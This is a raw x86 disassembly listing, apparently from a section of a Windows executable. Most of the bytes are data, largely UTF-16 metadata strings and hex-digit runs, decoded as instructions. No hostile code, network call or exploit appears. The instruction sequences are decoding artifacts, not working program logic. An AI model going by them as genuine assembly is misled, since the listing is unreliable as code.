  403caa:	ins    BYTE PTR es:[edi],dx
  403cab:	add    BYTE PTR [ebx+0x0],dh
  403cae:	add    BYTE PTR cs:[ebx+0x0],dl
  403cb2:	je     0x403cb4
  403cb4:	jb     0x403cb6
  403cb6:	imul   eax,DWORD PTR [eax],0x67006e
  403cbc:	jae    0x403cbe
  403cbe:	add    BYTE PTR [ecx],cl
  403cc0:	inc    esp
  403cc1:	add    BYTE PTR [edi+0x0],ch
  403cc4:	outs   dx,BYTE PTR ds:[esi]
  403cc5:	add    BYTE PTR [ebp+0x0],ah
  403cc8:	add    BYTE PTR ds:0x720045,cl
  403cce:	jb     0x403cd0
  403cd0:	outs   dx,DWORD PTR ds:[esi]
  403cd1:	add    BYTE PTR [edx+0x0],dh
  403cd4:	xor    DWORD PTR [eax],eax
  403cd6:	add    BYTE PTR ds:0x720045,cl
  403cdc:	jb     0x403cde
  403cde:	outs   dx,DWORD PTR ds:[esi]
  403cdf:	add    BYTE PTR [edx+0x0],dh
  403ce2:	xor    al,BYTE PTR [eax]
  403ce4:	add    BYTE PTR [ebx+0x4d],cl
  403ce7:	add    BYTE PTR [ebp+0x0],dh
  403cea:	jae    0x403cec
  403cec:	je     0x403cee
  403cee:	dec    esi
  403cef:	add    BYTE PTR [edi+0x0],ch
  403cf2:	je     0x403cf4
  403cf4:	push   ebx
  403cf5:	add    BYTE PTR [eax+0x0],dh
  403cf8:	add    BYTE PTR gs:[ebx+0x0],ah
  403cfc:	imul   eax,DWORD PTR [eax],0x790066
  403d02:	inc    edx
  403d03:	add    BYTE PTR [edi+0x0],ch
  403d06:	je     0x403d08
  403d08:	push   0x69005000
  403d0d:	add    BYTE PTR [eax+0x0],dh
  403d10:	add    BYTE PTR gs:[eax+eax*1+0x69],ch
  403d15:	add    BYTE PTR [esi+0x0],ch
  403d18:	add    BYTE PTR gs:[edi+0x0],cl
  403d1c:	jb     0x403d1e
  403d1e:	inc    ecx
  403d1f:	add    BYTE PTR [eax+eax*1+0x64],ah
  403d23:	add    BYTE PTR [ecx+0x0],cl
  403d26:	outs   dx,BYTE PTR ds:[esi]
  403d27:	add    BYTE PTR [edx+0x0],dl
  403d2a:	outs   dx,DWORD PTR ds:[esi]
  403d2b:	add    BYTE PTR [edi+0x0],ch
  403d2e:	je     0x403d30
  403d30:	add    BYTE PTR ds:0x75004d,bh
  403d36:	jae    0x403d38
  403d38:	je     0x403d3a
  403d3a:	push   ebx
  403d3b:	add    BYTE PTR [eax+0x0],dh
  403d3e:	add    BYTE PTR gs:[ebx+0x0],ah
  403d42:	imul   eax,DWORD PTR [eax],0x790066
  403d48:	push   eax
  403d49:	add    BYTE PTR [ecx+0x0],ch
  403d4c:	jo     0x403d4e
  403d4e:	add    BYTE PTR gs:[eax+eax*1+0x69],ch
  403d53:	add    BYTE PTR [esi+0x0],ch
  403d56:	add    BYTE PTR gs:[edi+0x0],cl
  403d5a:	jb     0x403d5c
  403d5c:	inc    ecx
  403d5d:	add    BYTE PTR [eax+eax*1+0x64],ah
  403d61:	add    BYTE PTR [ecx+0x0],cl
  403d64:	outs   dx,BYTE PTR ds:[esi]
  403d65:	add    BYTE PTR [edx+0x0],dl
  403d68:	outs   dx,DWORD PTR ds:[esi]
  403d69:	add    BYTE PTR [edi+0x0],ch
  403d6c:	je     0x403d6e
  403d6e:	add    BYTE PTR [edi],dl
  403d70:	push   eax
  403d71:	add    BYTE PTR [ecx+0x0],ah
  403d74:	je     0x403d76
  403d76:	push   0x6e004900
  403d7b:	add    BYTE PTR [esi+0x0],dh
  403d7e:	popa   
  403d7f:	add    BYTE PTR [eax+eax*1+0x69],ch
  403d83:	add    BYTE PTR [eax+eax*1+0x0],ah
  403d87:	and    DWORD PTR [ebp+0x0],edx
  403d8a:	outs   dx,BYTE PTR ds:[esi]
  403d8b:	add    BYTE PTR [ebx+0x0],ch
  403d8e:	outs   dx,BYTE PTR ds:[esi]
  403d8f:	add    BYTE PTR [edi+0x0],ch
  403d92:	ja     0x403d94
  403d94:	outs   dx,BYTE PTR ds:[esi]
  403d95:	add    BYTE PTR [eax+0x0],dl
  403d98:	popa   
  403d99:	add    BYTE PTR [edx+0x0],dh
  403d9c:	popa   
  403d9d:	add    BYTE PTR [ebp+0x0],ch
  403da0:	add    BYTE PTR gs:[eax+eax*1+0x65],dh
  403da5:	add    BYTE PTR [edx+0x0],dh
  403da8:	add    BYTE PTR [ebx],cl
  403daa:	push   ebp
  403dab:	add    BYTE PTR [ebx+0x0],dh
  403dae:	popa   
  403daf:	add    BYTE PTR [edi+0x0],ah
  403db2:	add    BYTE PTR gs:[eax],al
  403db5:	xorps  xmm0,XMMWORD PTR [eax]
  403db8:	popa   
  403db9:	add    BYTE PTR [edx+0x0],dh
  403dbc:	outs   dx,BYTE PTR ds:[esi]
  403dbd:	add    BYTE PTR [ecx+0x0],ch
  403dc0:	outs   dx,BYTE PTR ds:[esi]
  403dc1:	add    BYTE PTR [edi+0x0],ah
  403dc4:	add    BYTE PTR [eax],al
  403dc6:	add    BYTE PTR [eax],al
  403dc8:	inc    edx
  403dc9:	mov    dh,0x6
  403dcb:	cwde   
  403dcc:	test   DWORD PTR [eax-0x39],ebp
  403dcf:	inc    ebp
  403dd0:	xchg   ebx,eax
  403dd1:	in     al,0x38
  403dd3:	adc    BYTE PTR [ebx+0x5ccec3],bh
  403dd9:	add    al,0x20
  403ddb:	add    DWORD PTR [ecx],eax
  403ddd:	or     BYTE PTR ds:0x11010120,al
  403de3:	or     eax,0x1012004
  403de8:	add    al,BYTE PTR [eax+eiz*1]
  403deb:	add    DWORD PTR [ecx],eax
  403ded:	push   cs
  403dee:	add    eax,0xe010220
  403df3:	push   cs
  403df4:	add    esp,DWORD PTR [eax]
  403df6:	add    BYTE PTR [ecx],al
  403df8:	add    eax,0x11010120
  403dfd:	pop    ecx
  403dfe:	push   es
  403dff:	and    BYTE PTR [ecx],al
  403e01:	add    DWORD PTR [ecx],edx
  403e03:	add    BYTE PTR [ebp+0x12000005],0x80
  403e0a:	lea    eax,[ebx]
  403e0c:	and    BYTE PTR [eax],al
  403e0e:	push   cs
  403e0f:	push   es
  403e10:	add    BYTE PTR [ecx],al
  403e12:	adc    al,BYTE PTR [eax+0x50e91]
  403e18:	add    al,BYTE PTR [ecx]
  403e1a:	push   cs
  403e1b:	sbb    al,0x4
  403e1d:	pop    es
  403e1e:	add    DWORD PTR [edx],edx
  403e20:	push   ebp
  403e21:	add    al,0x0
  403e23:	add    BYTE PTR [edx],dl
  403e25:	push   ebp
  403e26:	add    eax,0x80120000
  403e2b:	add    DWORD PTR ds:0x80120020,0x1200681
  403e35:	add    DWORD PTR [edx],edx
  403e37:	add    BYTE PTR [ecx+0x12000005],0x80
  403e3e:	cdq    
  403e3f:	add    esp,DWORD PTR [eax]
  403e41:	add    BYTE PTR [eax],cl
  403e43:	add    eax,0x80120020
  403e48:	popf   
  403e49:	sbb    BYTE PTR [edi],al
  403e4b:	adc    BYTE PTR [esi],cl
  403e4d:	push   cs
  403e4e:	add    al,BYTE PTR [edx]
  403e50:	push   cs
  403e51:	sbb    eax,0x1208020e
  403e56:	popa   
  403e57:	or     BYTE PTR [edx],dl
  403e59:	adc    ch,BYTE PTR gs:[ecx+0x12]
  403e5d:	ins    DWORD PTR es:[edi],dx
  403e5e:	sbb    eax,0x50e080e
  403e63:	add    BYTE PTR [edx],al
  403e65:	add    cl,BYTE PTR [esi]
  403e67:	push   cs
  403e68:	or     BYTE PTR [eax],al
  403e6a:	add    eax,DWORD PTR [edx]
  403e6c:	push   cs
  403e6d:	push   cs
  403e6e:	adc    DWORD PTR [eax+0x22007a5],eax
  403e74:	add    cl,BYTE PTR [esi]
  403e76:	adc    DWORD PTR [eax+0x12004a5],eax
  403e7c:	push   cs
  403e7d:	or     BYTE PTR ds:0x80120000,al
  403e83:	test   eax,0xe030009
  403e88:	adc    al,BYTE PTR [eax+0x1c1d0ead]
  403e8e:	add    al,0x0
  403e90:	add    DWORD PTR [edx],eax
  403e92:	push   cs
  403e93:	add    al,0x0
  403e95:	add    DWORD PTR [esi],ecx
  403e97:	push   cs
  403e98:	add    eax,0xe1d0100
  403e9d:	push   cs
  403e9e:	add    eax,0xe010220
  403ea3:	sbb    al,0x4
  403ea5:	add    BYTE PTR [ecx],al
  403ea7:	add    DWORD PTR [esi],ecx
  403ea9:	or     BYTE PTR [eax],al
  403eab:	add    DWORD PTR [edx],edx
  403ead:	cmp    BYTE PTR [ecx+0x5bd8011],0x20
  403eb4:	add    BYTE PTR [edx],dl
  403eb6:	or     BYTE PTR [ebp+0x1022007],0xe
  403ebd:	adc    al,BYTE PTR [eax+0x220078d]
  403ec3:	push   cs
  403ec4:	push   cs
  403ec5:	adc    al,BYTE PTR [eax+0x7ab70881]
  403ecb:	pop    esp
  403ecc:	push   esi
  403ecd:	sbb    DWORD PTR [eax+eiz*8],esi
  403ed0:	mov    DWORD PTR [eax],edx
	...
  403eda:	add    al,0x0
  403edc:	add    BYTE PTR [eax],al
  403ede:	add    BYTE PTR [eax],al
  403ee0:	add    BYTE PTR [eax],al
  403ee2:	push   cs
  403ee3:	xor    al,0x0
  403ee5:	add    BYTE PTR cs:[eax],dh
  403ee8:	add    BYTE PTR [esi],ch
  403eea:	add    BYTE PTR [eax],dh
  403eec:	add    BYTE PTR [esi],ch
  403eee:	add    BYTE PTR [eax],dh
  403ef0:	add    BYTE PTR [edx],bl
  403ef2:	inc    ecx
  403ef3:	add    BYTE PTR [eax+eax*1+0x64],ah
  403ef7:	add    BYTE PTR [ecx+0x0],cl
  403efa:	outs   dx,BYTE PTR ds:[esi]
  403efb:	add    BYTE PTR [ebp+0x0],dl
  403efe:	je     0x403f00
  403f00:	imul   eax,DWORD PTR [eax],0x2e006c
  403f06:	add    BYTE PTR gs:[eax+0x0],bh
  403f0a:	add    BYTE PTR gs:[ecx+ebp*4+0x0],bl
  403f0f:	and    BYTE PTR [eax],al
  403f11:	dec    ebp
  403f12:	add    BYTE PTR [ecx+0x0],ch
  403f15:	arpl   WORD PTR [eax],ax
  403f17:	jb     0x403f19
  403f19:	outs   dx,DWORD PTR ds:[esi]
  403f1a:	add    BYTE PTR [ebx+0x0],dh
  403f1d:	outs   dx,DWORD PTR ds:[esi]
  403f1e:	add    BYTE PTR [esi+0x0],ah
  403f21:	je     0x403f23
  403f23:	and    BYTE PTR [eax],al
  403f25:	inc    ebx
  403f26:	add    BYTE PTR [edi+0x0],ch
  403f29:	jb     0x403f2b
  403f2b:	jo     0x403f2d
  403f2d:	outs   dx,DWORD PTR ds:[esi]
  403f2e:	add    BYTE PTR [edx+0x0],dh
  403f31:	popa   
  403f32:	add    BYTE PTR [eax+eax*1+0x69],dh
  403f36:	add    BYTE PTR [edi+0x0],ch
  403f39:	outs   dx,BYTE PTR ds:[esi]
  403f3a:	add    BYTE PTR [esi],ch
  403f3c:	add    BYTE PTR [eax],ah
  403f3e:	add    BYTE PTR [eax],ah
  403f40:	add    BYTE PTR [ecx+0x0],al
  403f43:	ins    BYTE PTR es:[edi],dx
  403f44:	add    BYTE PTR [eax+eax*1+0x20],ch
  403f48:	add    BYTE PTR [edx+0x0],dh
  403f4b:	imul   eax,DWORD PTR [eax],0x680067
  403f51:	je     0x403f53
  403f53:	jae    0x403f55
  403f55:	and    BYTE PTR [eax],al
  403f57:	jb     0x403f59
  403f59:	add    BYTE PTR gs:[ebx+0x0],dh
  403f5d:	add    BYTE PTR gs:[edx+0x0],dh
  403f61:	jbe    0x403f63
  403f63:	add    BYTE PTR gs:[eax+eax*1+0x2e],ah
  403f68:	add    BYTE PTR [eax],dl
  403f6a:	xor    al,0x0
  403f6c:	add    BYTE PTR cs:[esi],dh
  403f6f:	add    BYTE PTR [esi],ch
  403f71:	add    BYTE PTR [edi],dh
  403f73:	add    BYTE PTR [ecx],bh
  403f75:	add    BYTE PTR [esi],ch
  403f77:	add    BYTE PTR [eax],dh
  403f79:	add    BYTE PTR [edx],cl
  403f7b:	xor    eax,DWORD PTR [eax]
  403f7d:	xor    BYTE PTR [eax],al
  403f7f:	xor    eax,DWORD PTR [eax]
  403f81:	xor    DWORD PTR [eax],eax
  403f83:	cmp    DWORD PTR [eax],eax
  403f85:	add    dh,BYTE PTR [eax]
  403f87:	add    BYTE PTR [edi+ebp*2],al
  403f8a:	jbe    0x403f8c
  403f8c:	add    BYTE PTR [eax],ah
  403f8e:	bound  eax,QWORD PTR [eax]
  403f90:	aaa    
  403f91:	add    BYTE PTR [edi],dh
  403f93:	add    BYTE PTR [ecx+0x0],ah
  403f96:	xor    eax,0x35006300
  403f9b:	add    BYTE PTR [esi],dh
  403f9d:	add    BYTE PTR [ecx],dh
  403f9f:	add    BYTE PTR [ecx],bh
  403fa1:	add    BYTE PTR [ebx],dh
  403fa3:	add    BYTE PTR [eax+eax*1],dh
  403fa6:	add    BYTE PTR gs:[eax],dh
  403fa9:	add    BYTE PTR [eax],bh
  403fab:	add    BYTE PTR [ecx],bh
  403fad:	add    BYTE PTR [eax+0x30],al
  403fb0:	add    BYTE PTR [eax],dh
  403fb2:	add    BYTE PTR [eax],dh
  403fb4:	add    BYTE PTR [eax],dh
  403fb6:	add    BYTE PTR [eax],dh
  403fb8:	add    BYTE PTR [eax],dh
  403fba:	add    BYTE PTR [eax],dh
  403fbc:	add    BYTE PTR [eax],dh
  403fbe:	add    BYTE PTR [eax],dh
  403fc0:	add    BYTE PTR [eax],dh
  403fc2:	add    BYTE PTR [eax],dh
  403fc4:	add    BYTE PTR [eax],dh
  403fc6:	add    BYTE PTR [eax],dh
  403fc8:	add    BYTE PTR [eax],dh
  403fca:	add    BYTE PTR [eax],dh
  403fcc:	add    BYTE PTR [eax],dh
  403fce:	add    BYTE PTR [eax],dh
  403fd0:	add    BYTE PTR [eax+eax*1],dh
  403fd3:	xor    BYTE PTR [eax],al
  403fd5:	xor    BYTE PTR [eax],al
  403fd7:	xor    BYTE PTR [eax],al
  403fd9:	xor    BYTE PTR [eax],al
  403fdb:	xor    BYTE PTR [eax],al
  403fdd:	xor    BYTE PTR [eax],al
  403fdf:	xor    BYTE PTR [eax],al
  403fe1:	xor    BYTE PTR [eax],al
  403fe3:	xor    BYTE PTR [eax],al
  403fe5:	xor    BYTE PTR [eax],al
  403fe7:	xor    BYTE PTR [eax],al
  403fe9:	xor    BYTE PTR [eax],al
  403feb:	xor    BYTE PTR [eax],al
  403fed:	xor    BYTE PTR [eax],al
  403fef:	and    BYTE PTR [ebx],dh
  403ff1:	add    BYTE PTR [ecx],dh
  403ff3:	add    BYTE PTR [edx+0x0],ah
  403ff6:	data16 add BYTE PTR [ebx],dh
  403ff9:	add    BYTE PTR [eax],bh
  403ffb:	add    BYTE PTR ds:0x61003600,dh
  404001:	add    BYTE PTR [eax+eax*1+0x33],ah
  404005:	add    BYTE PTR [esi],dh
  404007:	add    BYTE PTR [eax+eax*1],dh
  40400a:	add    BYTE PTR gs:[ebx],dh
  40400d:	add    BYTE PTR ds:0x30808200,dh
  404013:	add    BYTE PTR [eax],dh
  404015:	add    BYTE PTR [edx],dh
  404017:	add    BYTE PTR [eax+eax*1],dh
  40401a:	xor    BYTE PTR [eax],al
  40401c:	xor    BYTE PTR [eax],al
  40401e:	xor    BYTE PTR [eax],al
  404020:	xor    BYTE PTR [eax],al
  404022:	xor    BYTE PTR [eax],al
  404024:	xor    al,0x0
  404026:	cmp    BYTE PTR [eax],al
  404028:	xor    BYTE PTR [eax],al
  40402a:	xor    BYTE PTR [eax],al
  40402c:	xor    BYTE PTR [eax],al
  40402e:	xor    BYTE PTR [eax],al
  404030:	xor    BYTE PTR [eax],al
  404032:	cmp    DWORD PTR [eax],eax
  404034:	xor    al,0x0
  404036:	xor    BYTE PTR [eax],al
  404038:	xor    BYTE PTR [eax],al
  40403a:	xor    BYTE PTR [eax],al
  40403c:	xor    BYTE PTR [eax],al
  40403e:	xor    BYTE PTR [eax],al
  404040:	xor    BYTE PTR [eax],al
  404042:	xor    BYTE PTR [eax],al
  404044:	add    BYTE PTR ss:[eax],dh
  404047:	add    BYTE PTR [edx],dh
  404049:	add    BYTE PTR [eax],dh
  40404b:	add    BYTE PTR [eax],dh
  40404d:	add    BYTE PTR [eax],dh
  40404f:	add    BYTE PTR [eax],dh
  404051:	add    BYTE PTR [eax],dh
  404053:	add    BYTE PTR [eax],dh
  404055:	add    BYTE PTR [edx],dh
  404057:	add    BYTE PTR [eax+eax*1],dh
  40405a:	xor    BYTE PTR [eax],al
  40405c:	xor    BYTE PTR [eax],al
  40405e:	xor    BYTE PTR [eax],al
  404060:	xor    BYTE PTR [eax],al
  404062:	xor    eax,0x35003200
  404067:	add    BYTE PTR [ebx],dh
  404069:	add    BYTE PTR [eax+eax*1],dh
  40406c:	xor    DWORD PTR [eax],eax
  40406e:	xor    eax,DWORD PTR [eax]
  404070:	xor    DWORD PTR [eax],eax
  404072:	xor    BYTE PTR [eax],al
  404074:	xor    BYTE PTR [eax],al
  404076:	xor    BYTE PTR [eax],al
  404078:	xor    al,0x0
  40407a:	xor    BYTE PTR [eax],al
  40407c:	xor    BYTE PTR [eax],al
  40407e:	xor    BYTE PTR [eax],al
  404080:	xor    BYTE PTR [eax],al
  404082:	xor    BYTE PTR [eax],al
  404084:	xor    DWORD PTR [eax],eax
  404086:	xor    BYTE PTR [eax],al
  404088:	xor    BYTE PTR [eax],al
  40408a:	xor    BYTE PTR [eax],al
  40408c:	xor    DWORD PTR [eax],eax
  40408e:	xor    BYTE PTR [eax],al
  404090:	xor    BYTE PTR [eax],al
  404092:	inc    edx
  404093:	add    BYTE PTR ds:0x43004600,dh
  404099:	add    BYTE PTR [ecx],bh
  40409b:	add    BYTE PTR [eax],dh
  40409d:	add    BYTE PTR [ebp+0x0],al
  4040a0:	aaa    
  4040a1:	add    BYTE PTR [eax],dh
  4040a3:	add    BYTE PTR [edx],dh
  4040a5:	add    BYTE PTR [edi],dh
  4040a7:	add    BYTE PTR [esi+0x0],al
  4040aa:	add    BYTE PTR ss:[edi],dh
  4040ad:	add    BYTE PTR [eax],bh
  4040af:	add    BYTE PTR [edi],dh
  4040b1:	add    BYTE PTR [ecx],dh
  4040b3:	add    BYTE PTR [ebp+0x0],al
  4040b6:	aaa    
  4040b7:	add    BYTE PTR [edi],dh
  4040b9:	add    BYTE PTR [ebx],dh
  4040bb:	add    BYTE PTR [ecx+0x0],al
  4040be:	cmp    BYTE PTR [eax],al
  4040c0:	inc    esi
  4040c1:	add    BYTE PTR [eax+eax*1+0x45],al
  4040c5:	add    BYTE PTR [eax],bh
  4040c7:	add    BYTE PTR [ecx],bh
  4040c9:	add    BYTE PTR [ebx],dh
  4040cb:	add    BYTE PTR [eax],bh
  4040cd:	add    BYTE PTR [ebx+0x0],al
  4040d0:	cmp    BYTE PTR [eax],al
  4040d2:	xor    DWORD PTR [eax],eax
  4040d4:	inc    esp
  4040d5:	add    BYTE PTR [eax+eax*1+0x34],al
  4040d9:	add    BYTE PTR [eax],dh
  4040db:	add    BYTE PTR [edx],dh
  4040dd:	add    BYTE PTR [edx+0x0],al
  4040e0:	inc    ecx
  4040e1:	add    BYTE PTR [esi],dh
  4040e3:	add    BYTE PTR ds:0x39004200,dh
  4040e9:	add    BYTE PTR [edx],dh
  4040eb:	add    BYTE PTR [eax],dh
  4040ed:	add    BYTE PTR [ecx],dh
  4040ef:	add    BYTE PTR [eax+eax*1+0x36],al
  4040f3:	add    BYTE PTR [eax],dh
  4040f5:	add    BYTE PTR ds:0x33003900,dh
  4040fb:	add    BYTE PTR [ebp+0x0],al
  4040fe:	cmp    DWORD PTR [eax],eax
  404100:	add    BYTE PTR ss:[ebx+0x0],al
  404104:	xor    al,0x0
  404106:	cmp    DWORD PTR [eax],eax
  404108:	xor    al,BYTE PTR [eax]
  40410a:	add    BYTE PTR ss:0x45003100,dh
  404111:	add    BYTE PTR [eax],bh
  404113:	add    BYTE PTR [eax],bh
  404115:	add    BYTE PTR [ecx],bh
  404117:	add    BYTE PTR [ebx+0x0],al
  40411a:	inc    ebx
  40411b:	add    BYTE PTR [ecx],dh
  40411d:	add    BYTE PTR [ebx],dh
  40411f:	add    BYTE PTR [esi+0x0],al
  404122:	xor    DWORD PTR [eax],eax
  404124:	xor    al,0x0
  404126:	xor    DWORD PTR [eax],eax
  404128:	xor    eax,0x42004500
  40412d:	add    BYTE PTR [edx+0x0],al
  404130:	xor    eax,0x46003300
  404135:	add    BYTE PTR [ecx+0x0],al
  404138:	inc    ebx
  404139:	add    BYTE PTR [ecx],dh
  40413b:	add    BYTE PTR [ecx],dh
  40413d:	add    BYTE PTR [ebx],dh
  40413f:	add    BYTE PTR [ecx],dh
  404141:	add    BYTE PTR [ecx+0x0],al
  404144:	inc    ebp
  404145:	add    BYTE PTR [eax],dh
  404147:	add    BYTE PTR [edx+0x0],al
  40414a:	inc    esp
  40414b:	add    BYTE PTR [ebx],dh
  40414d:	add    BYTE PTR [ebx],dh
  40414f:	add    BYTE PTR [ebx],dh
  404151:	add    BYTE PTR [ebx+0x0],al
  404154:	xor    eax,0x45004500
  404159:	add    BYTE PTR [esi],dh
  40415b:	add    BYTE PTR [eax],dh
  40415d:	add    BYTE PTR [edx],dh
  40415f:	add    BYTE PTR [ecx],dh
  404161:	add    BYTE PTR [esi],dh
  404163:	add    BYTE PTR [edi],dh
  404165:	add    BYTE PTR [edx],dh
  404167:	add    BYTE PTR [eax+eax*1+0x39],al
  40416b:	add    BYTE PTR [edi],dh
  40416d:	add    BYTE PTR [ecx],dh
  40416f:	add    BYTE PTR [eax],bh
  404171:	add    BYTE PTR [ebp+0x0],al
  404174:	inc    ecx
  404175:	add    BYTE PTR [ebx],dh
  404177:	add    BYTE PTR [ecx],dh
  404179:	add    BYTE PTR [ecx+0x0],al
  40417c:	cmp    BYTE PTR [eax],al
  40417e:	inc    ecx
  40417f:	add    BYTE PTR [ebp+0x0],al
  404182:	inc    edx
  404183:	add    BYTE PTR [eax+eax*1+0x30],al
  404187:	add    BYTE PTR [eax+eax*1+0x41],al
  40418b:	add    BYTE PTR [eax],dh
  40418d:	add    BYTE PTR [eax],dh
  40418f:	add    BYTE PTR [edi],dh
  404191:	add    BYTE PTR [edx],dh
  404193:	add    BYTE PTR [esi+0x0],al
  404196:	xor    al,BYTE PTR [eax]
  404198:	xor    eax,0x38004400
  40419d:	add    BYTE PTR [edi],dh
  40419f:	add    BYTE PTR [eax+eax*1+0x42],al
  4041a3:	add    BYTE PTR [ecx+0x0],al
  4041a6:	add    BYTE PTR ss:[esi+0x0],al
  4041aa:	inc    ebx
  4041ab:	add    BYTE PTR [ecx],bh
  4041ad:	add    BYTE PTR [eax],dh
  4041af:	add    BYTE PTR [esi+0x0],al
  4041b2:	inc    esi
  4041b3:	add    BYTE PTR [eax+eax*1+0x35],al
  4041b7:	add    BYTE PTR [ecx],bh
  4041b9:	add    BYTE PTR [eax],bh
  4041bb:	add    BYTE PTR [ebp+0x0],al
  4041be:	inc    esp
  4041bf:	add    BYTE PTR [eax+eax*1],dh
  4041c2:	inc    esp
  4041c3:	add    BYTE PTR [ecx+0x0],al
  4041c6:	xor    eax,DWORD PTR [eax]
  4041c8:	xor    eax,0x34004500
  4041cd:	add    BYTE PTR [eax+eax*1],dh
  4041d0:	inc    ebx
  4041d1:	add    BYTE PTR [ebx],dh
  4041d3:	add    BYTE PTR [ecx],bh
  4041d5:	add    BYTE PTR [eax],bh
  4041d7:	add    BYTE PTR [ebx+0x0],al
  4041da:	xor    al,0x0
  4041dc:	xor    eax,0x33003400
  4041e1:	add    BYTE PTR [eax],dh
  4041e3:	add    BYTE PTR [edi],dh
  4041e5:	add    BYTE PTR [ebp+0x0],al
  4041e8:	cmp    BYTE PTR [eax],al
  4041ea:	inc    ebp
  4041eb:	add    BYTE PTR [ebx],dh
  4041ed:	add    BYTE PTR [ebx],dh
  4041ef:	add    BYTE PTR [edx+0x0],al
  4041f2:	cmp    BYTE PTR [eax],al
  4041f4:	xor    al,0x0
  4041f6:	xor    al,BYTE PTR [eax]
  4041f8:	add    BYTE PTR ss:[ecx],dh
  4041fb:	add    BYTE PTR [eax+eax*1],dh
  4041fe:	xor    eax,DWORD PTR [eax]
  404200:	inc    esp
  404201:	add    BYTE PTR [ecx+0x0],al
  404204:	inc    ebp
  404205:	add    BYTE PTR [ebx+0x0],al
  404208:	cmp    DWORD PTR [eax],eax
  40420a:	inc    esi
  40420b:	add    BYTE PTR ds:0x36003900,dh
  404211:	add    BYTE PTR [eax],bh
  404213:	add    BYTE PTR [ebx],dh
  404215:	add    BYTE PTR [esi],dh
  404217:	add    BYTE PTR [esi+0x0],al
  40421a:	cmp    DWORD PTR [eax],eax
  40421c:	aaa    
  40421d:	add    BYTE PTR [ebx+0x0],al
  404220:	cmp    BYTE PTR [eax],al
  404222:	inc    esi
  404223:	add    BYTE PTR [edi],dh
  404225:	add    BYTE PTR [eax+eax*1],dh
  404228:	aaa    
  404229:	add    BYTE PTR ds:0x45003000,dh
  40422f:	add    BYTE PTR ds:0x37003900,dh
  404235:	add    BYTE PTR ds:0x36004300,dh
  40423b:	add    BYTE PTR [eax+eax*1],dh
  40423e:	inc    ebp
  40423f:	add    BYTE PTR [edx],dh
  404241:	add    BYTE PTR [ecx],dh
  404243:	add    BYTE PTR [eax],bh
  404245:	add    BYTE PTR [ecx],bh
  404247:	add    BYTE PTR [esi+0x0],al
  40424a:	xor    al,0x0
  40424c:	xor    eax,0x45004400
  404251:	add    BYTE PTR [esi+0x0],al
  404254:	xor    al,0x0
  404256:	add    BYTE PTR ss:[edx+0x0],al
  40425a:	xor    al,BYTE PTR [eax]
  40425c:	inc    ecx
  40425d:	add    BYTE PTR [edx],dh
  40425f:	add    BYTE PTR [edx+0x0],al
  404262:	xor    DWORD PTR [eax],eax
  404264:	xor    al,BYTE PTR [eax]
  404266:	xor    al,0x0
  404268:	aaa    
  404269:	add    BYTE PTR [ecx+0x0],al
  40426c:	inc    esp
  40426d:	add    BYTE PTR [ebx+0x0],al
  404270:	xor    eax,DWORD PTR [eax]
  404272:	add    BYTE PTR ss:0x42003200,dh
  404279:	add    BYTE PTR [esi+0x0],al
  40427c:	xor    eax,0x33004300
  404281:	add    BYTE PTR [eax],dh
  404283:	add    BYTE PTR [eax],bh
  404285:	add    BYTE PTR [eax],dh
  404287:	add    BYTE PTR ds:0x44003500,dh
  40428d:	add    BYTE PTR [ecx+0x0],al
  404290:	cmp    DWORD PTR [eax],eax
  404292:	and    BYTE PTR [edi],dh
  404294:	add    BYTE PTR [ebx+0x0],ah
  404297:	add    BYTE PTR gs:[ebx+0x0],ah
  40429b:	cmp    BYTE PTR [eax],al
  40429d:	xor    eax,0x37006400
  4042a2:	add    BYTE PTR [edx+0x0],ah
  4042a5:	add    BYTE PTR gs:[ecx+0x0],ah
  4042a9:	aaa    
  4042aa:	add    BYTE PTR [edi],dh
  4042ac:	add    BYTE PTR [ecx],bh
  4042ae:	add    BYTE PTR [eax],bh
  4042b0:	add    BYTE PTR [ebp+0x0],ah
  4042b3:	add    BYTE PTR [eax+0x300030],0x32
  4042ba:	add    BYTE PTR [eax+eax*1],dh
  4042bd:	xor    BYTE PTR [eax],al
  4042bf:	xor    BYTE PTR [eax],al
  4042c1:	xor    BYTE PTR [eax],al
  4042c3:	xor    BYTE PTR [eax],al
  4042c5:	xor    BYTE PTR [eax],al
  4042c7:	xor    al,0x0
  4042c9:	cmp    BYTE PTR [eax],al
  4042cb:	xor    BYTE PTR [eax],al
  4042cd:	xor    BYTE PTR [eax],al
  4042cf:	xor    BYTE PTR [eax],al
  4042d1:	xor    BYTE PTR [eax],al
  4042d3:	xor    BYTE PTR [eax],al
  4042d5:	cmp    DWORD PTR [eax],eax
  4042d7:	xor    al,0x0
  4042d9:	xor    BYTE PTR [eax],al
  4042db:	xor    BYTE PTR [eax],al
  4042dd:	xor    BYTE PTR [eax],al
  4042df:	xor    BYTE PTR [eax],al
  4042e1:	xor    BYTE PTR [eax],al
  4042e3:	xor    BYTE PTR [eax],al
  4042e5:	xor    BYTE PTR [eax],al
  4042e7:	add    BYTE PTR ss:[eax],dh
  4042ea:	add    BYTE PTR [edx],dh
  4042ec:	add    BYTE PTR [eax],dh
  4042ee:	add    BYTE PTR [eax],dh
  4042f0:	add    BYTE PTR [eax],dh
  4042f2:	add    BYTE PTR [eax],dh
  4042f4:	add    BYTE PTR [eax],dh
  4042f6:	add    BYTE PTR [eax],dh
  4042f8:	add    BYTE PTR [edx],dh
  4042fa:	add    BYTE PTR [eax+eax*1],dh
  4042fd:	xor    BYTE PTR [eax],al
  4042ff:	xor    BYTE PTR [eax],al
  404301:	xor    BYTE PTR [eax],al
  404303:	xor    BYTE PTR [eax],al
  404305:	xor    eax,0x35003200
  40430a:	add    BYTE PTR [ebx],dh
  40430c:	add    BYTE PTR [eax+eax*1],dh
  40430f:	xor    DWORD PTR [eax],eax
  404311:	xor    eax,DWORD PTR [eax]
  404313:	xor    DWORD PTR [eax],eax
  404315:	xor    BYTE PTR [eax],al
  404317:	xor    BYTE PTR [eax],al
  404319:	xor    BYTE PTR [eax],al
  40431b:	xor    al,0x0
  40431d:	xor    BYTE PTR [eax],al
  40431f:	xor    BYTE PTR [eax],al
  404321:	xor    BYTE PTR [eax],al
  404323:	xor    BYTE PTR [eax],al
  404325:	xor    BYTE PTR [eax],al
  404327:	xor    DWORD PTR [eax],eax
  404329:	xor    BYTE PTR [eax],al
  40432b:	xor    BYTE PTR [eax],al
  40432d:	xor    BYTE PTR [eax],al
  40432f:	xor    DWORD PTR [eax],eax
  404331:	xor    BYTE PTR [eax],al
  404333:	xor    BYTE PTR [eax],al
  404335:	cmp    BYTE PTR [eax],al
  404337:	inc    esp
